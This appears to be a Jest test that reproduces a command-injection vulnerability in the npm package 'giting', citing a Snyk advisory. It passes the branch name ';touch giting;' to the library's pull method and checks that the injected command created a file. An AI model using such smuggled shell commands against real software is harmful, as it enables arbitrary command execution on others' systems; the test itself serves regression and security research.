//https://snyk.io/vuln/SNYK-JS-GITING-559008
test("Command Injection in giting", () => {
  const Test = require("giting");
  const fs = require("fs");
  const path = "./giting";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let injection_command = ";touch giting;";
  test = new Test({ workDir: "./" });
  repo = { organization: "./", name: "./", branch: injection_command };
  test.pull(repo, function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
